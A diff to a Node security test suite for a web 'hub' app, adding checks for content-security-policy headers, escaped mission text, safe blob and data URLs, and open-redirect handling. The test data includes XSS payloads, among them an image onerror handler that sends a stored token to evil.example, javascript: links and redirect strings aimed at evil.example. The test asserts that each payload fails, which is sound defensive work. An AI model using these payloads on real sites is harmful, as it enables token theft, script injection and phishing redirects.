@@ -1,6 +1,6 @@
 // test/security.test.js: the hub's security findings, one section each, every
 // one seen failing before its fix. Self-contained, zero deps, all data fake.
-// Starts its own hubs on ports 8201 to 8214, with scratch data dirs.
+// Starts its own hubs on ports 8201 to 8214 and 8216, with scratch data dirs.
 // Usage: node test/security.test.js
 'use strict';
 const fs = require('fs');
@@ -70,7 +70,7 @@ function rawRequest(port, text) {
 }
 const stop = async (h) => { h.proc.kill('SIGKILL'); await sleep(100); };
 const within = (ms, fn) => { const t0 = process.hrtime.bigint(); const r = fn(); return { ms: Number(process.hrtime.bigint() - t0) / 1e6, r, ok: Number(process.hrtime.bigint() - t0) / 1e6 < ms }; };
-const STATIC = ['index.html', 'v2.html', 'office.html', 'office-assets.html', 'v2/styleguide.html', 'v2/media.js', 'v2/peek-panel.js', 'v2/awaiting-merge.js'];
+const STATIC = ['app/index.html', 'office.html', 'office-assets.html', 'app/hub-auth.js', 'app/desk/parts.js', 'app/pages/mission.js', 'app/desk/merge.js'];
 
 async function finding1() {
   console.log('1. a malformed request gets a 400 and the process lives');
@@ -92,19 +92,10 @@ async function finding1() {
 
 async function finding2() {
   console.log('2. markdown notes cannot run script; dashboards carry a CSP');
-  const src = fs.readFileSync(path.join(ROOT, 'hub/public/v2/brain-browser.js'), 'utf8');
-  const code = src.slice(src.indexOf('function renderMarkdown'), src.lastIndexOf('\n  }\n})();'));
-  const esc = (s) => String(s == null ? '' : s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
-  const render = new Function('esc', `${code}\nreturn renderMarkdown;`)(esc);
-  const out = render('# Note\n\n<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bureau_token)">\n\n- <script>alert(1)</script>\n\n[bad](javascript:alert(1))\n\n[bad2](http://x/" onmouseover="alert(1))\n\n**<b>x</b>**\n');
-  check('no live tag from note text', !/<(img|script|b)\b/i.test(out.replace(/<\/?(h1|ul|li|p|strong)>/g, '')), out);
-  check('no javascript: href', !/href="javascript:/i.test(out), out);
-  check('no attribute escapes the href', !/href="http:\/\/x\/"/.test(out), out);
-  const good = render('# Title\n\nSome **bold** and a [link](https://example.com/a__b__c) and [note](knowledge/x.md)\n');
-  check('real markdown still renders', /<h1>Title<\/h1>/.test(good) && /<strong>bold<\/strong>/.test(good) && /href="https:\/\/example\.com\/a__b__c"/.test(good) && /data-brain-link="knowledge\/x\.md"/.test(good), good);
+  await markdownCannotRunScript();
 
   const h = await boot('f2', 8202);
-  for (const route of ['/', '/v2', '/office', '/office/assets', '/v2/styleguide']) {
+  for (const route of ['/', '/index.html', '/missions', '/missions/t-1', '/goals', '/brain', '/brain/knowledge/x.md', '/projects', '/agents', '/activity', '/settings', '/sign-in', '/office', '/office/assets']) {
     const r = await h.api('GET', route, undefined, { authorization: '' });
     const csp = r.headers.get('content-security-policy') || '';
     const nonce = (csp.match(/'nonce-([^']+)'/) || [])[1];
@@ -113,11 +104,75 @@ async function finding2() {
     check(`${route} inline scripts carry the nonce`, !!nonce && inline.every((m) => m[1].includes(nonce)), inline.map((m) => m[1]).slice(0, 3));
     check(`${route} connect-src stops other origins`, /connect-src 'self'/.test(csp) && !/connect-src[^;]*\*/.test(csp), csp);
   }
-  check('the v1 dashboard has no inline handlers left', !/\son[a-z]+="/.test(fs.readFileSync(path.join(ROOT, 'hub/public/index.html'), 'utf8')));
-  const t = (await h.api('POST', '/api/tasks', { title: 'x', project: 'general' })).json.task;
-  const page = await h.api('GET', `/m/${t.view_token}`, undefined, { authorization: '' });
-  check('a mission record page carries a CSP', /default-src 'none'/.test(page.headers.get('content-security-policy') || ''));
+  for (const route of ['/v2', '/v2/styleguide']) {
+    const r = await fetch(h.base + route, { redirect: 'manual' });
+    check(`${route} is a 301 to the Desk`, r.status === 301 && r.headers.get('location') === '/', { status: r.status, location: r.headers.get('location') });
+  }
+  for (const file of ['app/index.html', 'app/404.html', 'office.html', 'office-assets.html', 'omako-ds/NOTICE.md']) {
+    check(`${file} has no inline handler`, !/\son[a-z]+\s*=\s*["']/i.test(fs.readFileSync(path.join(ROOT, 'hub/public', file), 'utf8')));
+  }
+  const missing = await h.api('GET', '/no-such-page', undefined, { authorization: '' });
+  // The 404 and the link pages run only this hub's own static scripts (the dither).
+  const ownScriptsOnly = (csp) => /default-src 'none'/.test(csp) && (csp.match(/script-src ([^;]*)/) || [])[1] === "'self'";
+  const scriptsAreFiles = (html) => [...html.matchAll(/<script\b([^>]*)>/gi)].every((m) => /\bsrc="\/(omako-ds|app)\/[\w/-]+\.js"/.test(m[1]));
+  check('the HTML 404 allows only this hub\'s own scripts', missing.code === 404 && ownScriptsOnly(missing.headers.get('content-security-policy') || ''), missing.headers.get('content-security-policy'));
+  check('the HTML 404 has no inline script and no inline handler', scriptsAreFiles(missing.text) && !/\son[a-z]+\s*=\s*["']/i.test(missing.text));
+
+  const hostile = '<script>alert(1)</script><img src=x onerror=alert(2)>';
+  const t = (await h.api('POST', '/api/tasks', { title: hostile, body: hostile, project: 'general', gate: 'critic' })).json.task;
+  await h.api('POST', '/api/agents/register', { name: 'sec-worker', kind: 'test' });
+  await h.api('POST', '/api/tasks/claim', { agent: 'sec-worker', id: t.id });
+  await h.api('PATCH', `/api/tasks/${t.id}`, { agent: 'sec-worker', note: hostile, artifact: { label: hostile, url: 'javascript:alert(3)' } });
+  await h.api('PATCH', `/api/tasks/${t.id}`, { agent: 'sec-worker', status: 'review', note: hostile, items: [{ title: hostile, body: hostile }] });
+  const parked = (await h.api('GET', `/api/tasks/${t.id}`)).json;
+  const approveToken = (parked.task || parked).review_links.approve.token;
+  const pages = { [`/m/${t.view_token}`]: 'a mission record page', [`/r/${approveToken}`]: 'a review page', '/r/00000000000000000000000000000000': 'a dead review link' };
+  for (const [route, label] of Object.entries(pages)) {
+    const page = await h.api('GET', route, undefined, { authorization: '' });
+    const csp = page.headers.get('content-security-policy') || '';
+    check(`${label} carries a CSP`, /default-src 'none'/.test(csp), csp);
+    check(`${label} allows only this hub's own scripts`, ownScriptsOnly(csp), csp);
+    check(`${label} has no inline script`, scriptsAreFiles(page.text), page.text.slice(0, 300));
+    check(`${label} has no inline handler`, !/<[^>]*\son[a-z]+\s*=/i.test(page.text.replace(/&lt;[^]*?&gt;/g, '')), page.text.slice(0, 300));
+    check(`${label} loads the design system from the hub`, /<link rel="stylesheet" href="\/omako-ds\/css\/all\.css">/.test(page.text), page.text.slice(0, 300));
+  }
+  const record = await h.api('GET', `/m/${t.view_token}`, undefined, { authorization: '' });
+  check('mission text is escaped on the record page', record.text.includes('&lt;script&gt;alert(1)&lt;/script&gt;') && !record.text.includes('<script>alert(1)'), record.text.slice(0, 400));
+  check('an artifact url that is not http(s) is no link', !/href="javascript:/i.test(record.text), record.text.slice(0, 400));
   await stop(h);
+}
+
+// hub/public/app/markdown.js is an ES module, so its two files are copied to a
+// temporary folder marked as ESM and imported from there, as test/markdown.test.js does.
+async function markdownCannotRunScript() {
+  class StubNode {}
+  class Text extends StubNode { constructor(v) { super(); this.text = String(v); } }
+  class El extends StubNode {
+    constructor(tag) { super(); this.tag = tag; this.attrs = {}; this.kids = []; this.dataset = {}; this.props = {}; this.style = { setProperty() {} }; }
+    setAttribute(k, v) { this.attrs[k] = String(v); }
+    addEventListener(type) { this.listens = (this.listens || []).concat(type); }
+    append(...nodes) { this.kids.push(...nodes); }
+    replaceChildren(...nodes) { this.kids = nodes; }
+    set innerHTML(v) { throw new Error(`innerHTML assigned: ${v}`); }
+  }
+  globalThis.Node = StubNode;
+  globalThis.document = { createElement: (t) => new El(t), createElementNS: (_, t) => new El(t), createTextNode: (v) => new Text(v), createDocumentFragment: () => new El('#fragment') };
+  const dir = fs.mkdtempSync(path.join(SCRATCH, 'md-'));
+  fs.writeFileSync(path.join(dir, 'package.json'), '{"type":"module"}');
+  for (const f of ['markdown.js', 'dom.js']) fs.copyFileSync(path.join(ROOT, 'hub/public/app', f), path.join(dir, f));
+  const md = await import(require('url').pathToFileURL(path.join(dir, 'markdown.js')).href);
+
+  const walk = (node, seen = []) => { if (node instanceof El) { seen.push(node); node.kids.forEach((k) => walk(k, seen)); } return seen; };
+  const hostile = '# Note\n\n<img src=x onerror="fetch(\'https://evil.example/\'+localStorage.bureau_token)">\n\n- <script>alert(1)</script>\n\n[bad](javascript:alert(1))\n\n[bad2](http://x/" onmouseover="alert(1))\n\n**<b>x</b>**\n';
+  const els = walk(md.renderMarkdown(hostile));
+  check('no live tag from note text', !els.some((e) => ['script', 'b'].includes(e.tag) || (e.tag === 'img' && e.attrs.src === 'x')), els.map((e) => e.tag));
+  check('no event handler attribute from note text', !els.some((e) => Object.keys(e.attrs).some((a) => /^on/i.test(a))), els.map((e) => e.attrs));
+  check('no javascript: href', !els.some((e) => /^\s*javascript:/i.test(e.attrs.href || '')), els.map((e) => e.attrs.href).filter(Boolean));
+  check('text injected after an href stays text', !els.some((e) => /onmouseover/i.test(`${Object.keys(e.attrs).join(' ')} ${e.attrs.href || ''} ${e.attrs.title || ''}`)), els.map((e) => e.attrs));
+  check('safeHref refuses javascript:', !md.safeHref('javascript:alert(1)'), md.safeHref('javascript:alert(1)'));
+  check('safeHref keeps https', md.safeHref('https://example.com/a__b__c') === 'https://example.com/a__b__c', md.safeHref('https://example.com/a__b__c'));
+  const parsed = JSON.stringify(md.parseMarkdown('Some **bold** and a [link](https://example.com/a__b__c)\n'));
+  check('real markdown still parses', parsed.includes('bold') && parsed.includes('https://example.com/a__b__c'), parsed.slice(0, 300));
 }
 
 async function finding3() {
@@ -394,9 +449,105 @@ async function finding4() {
   await stop(h);
 }
 
+// hub/public/app/api.js has no DOM to speak of, only location, so a stub is enough.
+async function redirects() {
+  console.log('10. sign-in and navigate stay on this hub');
+  const dir = fs.mkdtempSync(path.join(SCRATCH, 'api-'));
+  fs.writeFileSync(path.join(dir, 'package.json'), '{"type":"module"}');
+  fs.copyFileSync(path.join(ROOT, 'hub/public/app/api.js'), path.join(dir, 'api.js'));
+  const origin = 'https://hub.example';
+  globalThis.location = { origin, href: `${origin}/sign-in`, pathname: '/sign-in', search: '', hash: '' };
+  const api = await import(require('url').pathToFileURL(path.join(dir, 'api.js')).href);
+  const next = (target) => api.nextPath(`?next=${encodeURIComponent(target)}`);
+  for (const evil of ['/.//evil.example/phish', '/..//evil.example/phish', '/./\\evil.example/phish', '/.\\/evil.example', '//evil.example/phish', '/\\evil.example', '/\t/evil.example', 'https://evil.example/', 'javascript:alert(1)', '/sign-in', '/sign-in?next=/x']) {
+    check(`next=${JSON.stringify(evil)} lands on the Desk`, next(evil) === '/', next(evil));
+  }
+  check('a real path keeps its query and hash', next('/missions/t-1?a=1#b') === '/missions/t-1?a=1#b', next('/missions/t-1?a=1#b'));
+  check('a percent-escape that only looks like a slash stays a path', new URL(next('/%2f%2fevil.example'), origin).origin === origin, next('/%2f%2fevil.example'));
+  check('localPath is exported for the router', typeof api.localPath === 'function');
+  if (typeof api.localPath === 'function') {
+    for (const evil of ['https://evil.example/', '//evil.example/', '/.//evil.example/', 'javascript:alert(1)']) check(`localPath refuses ${evil}`, api.localPath(evil) === null, api.localPath(evil));
+    check('localPath keeps a relative path', api.localPath('/brain/a%20b.md?x=1') === '/brain/a%20b.md?x=1', api.localPath('/brain/a%20b.md?x=1'));
+  }
+  const router = fs.readFileSync(path.join(ROOT, 'hub/public/app/router.js'), 'utf8');
+  check('navigate goes through localPath', /export function navigate[\s\S]*?localPath\(to\)/.test(router));
+}
+
+// hub/public/app/hub-auth.js is a plain script. Run it against a fake page and
+// see what URL each kind of bytes ends up under.
+async function activeContent() {
+  console.log('11. nothing that can run script gets a same-origin blob: URL');
+  const vm = require('vm');
+  const made = [];
+  class HubURL extends URL { static createObjectURL(b) { made.push(b.type); return `blob:${TOKEN}/${made.length}`; } static revokeObjectURL() {} }
+  class FileReader { readAsDataURL(b) { b.arrayBuffer().then((buf) => { this.result = `data:ignored;base64,${Buffer.from(buf).toString('base64')}`; this.onload(); }, (e) => this.onerror(e)); } }
+  let observer = null;
+  class MutationObserver { constructor(fn) { observer = fn; } observe() {} }
+  const TYPES = { png: 'image/png', jpg: 'image/jpeg', pdf: 'application/pdf', svg: 'image/svg+xml', svgmixed: 'IMAGE/SVG+XML; charset=utf-8', html: 'text/html', bin: 'application/octet-stream', none: '' };
+  const fetchStub = async (url) => {
+    const type = TYPES[new HubURL(url, 'https://hub.example').searchParams.get('file').split('.').pop()];
+    return { ok: true, blob: async () => new Blob(['<svg xmlns="http://www.w3.org/2000/svg"><script>x</script></svg>'], { type }) };
+  };
+  const sandbox = { URL: HubURL, Blob, FileReader, MutationObserver, fetch: fetchStub, Promise, Map, console, location: { href: 'https://hub.example/', hash: '' }, localStorage: { getItem: () => 'tok', setItem() {} }, history: { replaceState() {} }, document: { documentElement: {}, addEventListener() {}, hidden: false } };
+  sandbox.window = { addEventListener() {} };
+  vm.runInNewContext(fs.readFileSync(path.join(ROOT, 'hub/public/app/hub-auth.js'), 'utf8'), sandbox);
+  const element = (tag, attr, url, extra = {}) => {
+    const attrs = { [attr]: url, ...extra };
+    return { attrs, tag,
+      matches(sel) { return sel.startsWith(tag) && sel.includes(attr); },
+      getAttribute(k) { return attrs[k] === undefined ? null : attrs[k]; },
+      hasAttribute(k) { return k in attrs; },
+      setAttribute(k, v) { attrs[k] = v; },
+      removeAttribute(k) { delete attrs[k]; },
+      querySelectorAll() { return []; } };
+  };
+  async function show(tag, file, extra) {
+    const attr = tag === 'img' ? 'data-secure-src' : 'data-secure-href';
+    const el = element(tag, attr, `/api/knowledge?file=${file}&raw=1`, extra);
+    observer([{ addedNodes: [el] }]);
+    await sleep(40);
+    return el;
+  }
+  const svg = await show('img', 'a.svg');
+  check('an SVG image is a data: URL', /^data:image\/svg\+xml;base64,/.test(svg.src || ''), svg.src);
+  const mixed = await show('img', 'b.svgmixed');
+  check('an SVG with odd casing and parameters is still only data:', /^data:image\/svg\+xml;base64,/.test(mixed.src || ''), mixed.src);
+  const link = await show('a', 'c.svg');
+  check('an SVG link is a data: URL', /^data:image\/svg\+xml;base64,/.test(link.href || ''), link.href);
+  check('an SVG link saves, since a tab will not open data:', link.attrs.download === 'c.svg', link.attrs);
+  const png = await show('img', 'd.png');
+  check('a PNG gets a blob: URL', /^blob:/.test(png.src || ''), png.src);
+  const pdf = await show('a', 'e.pdf');
+  check('a PDF gets a blob: URL', /^blob:/.test(pdf.href || ''), pdf.href);
+  for (const kind of ['html', 'bin', 'none']) {
+    const el = await show(kind === 'html' ? 'a' : 'img', `f.${kind}`);
+    check(`a ${kind} response gets no URL at all`, el.src === undefined && el.href === undefined, { src: el.src, href: el.href });
+  }
+  const saved = await show('a', 'g.html', { download: 'g.html' });
+  check('a download of anything else is octet-stream data', /^data:application\/octet-stream;base64,/.test(saved.href || ''), saved.href);
+  const allowed = ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'application/pdf'];
+  check('every blob: URL made was an allowed type', made.length > 0 && made.every((t) => allowed.includes(t)), made);
+}
+
+async function missionRecord() {
+  console.log('12. the mission record page takes old records as they are');
+  const { dir } = hubEnv('f12', 8216);
+  const view = 'a'.repeat(32);
+  fs.mkdirSync(path.join(dir, 'data'), { recursive: true });
+  fs.writeFileSync(path.join(dir, 'data', 'state.json'), JSON.stringify({ schema_version: 1, seq: 2, agents: [], messages: [], log: [], projects: [{ id: 'general', label: 'General' }],
+    tasks: [{ id: 't-1', title: 'Old record', status: 'done', project: 'general', view_token: view, log: [{ by: 'someone', note: 'an entry with no timestamp' }, { ts: '2026-01-02T03:04:05.000Z', by: 'other', note: 'dated' }] }] }));
+  const h = await boot('f12', 8216);
+  const page = await h.api('GET', `/m/${view}`, undefined, { authorization: '' });
+  check('a log entry with no ts is not a 500', page.code === 200, page.code);
+  check('the entry is on the page', page.text.includes('an entry with no timestamp'), page.text.slice(0, 300));
+  check('a dated entry keeps its date', page.text.includes('01-02 03:04'), page.text.slice(0, 600));
+  check('a missing priority prints nothing', !page.text.includes('Pundefined') && !page.text.includes('Pnull'), page.text.slice(0, 600));
+  await stop(h);
+}
+
 async function main() {
   try {
-    const all = { finding1, finding2, finding3, finding5, finding6, finding7, finding8, finding9, finding4 };
+    const all = { finding1, finding2, finding3, finding5, finding6, finding7, finding8, finding9, finding4, redirects, activeContent, missionRecord };
     const only = process.env.SEC_ONLY; // SEC_ONLY=finding4 runs just that section
     for (const [name, fn] of Object.entries(all)) if (!only || only === name) await fn();
   } finally {
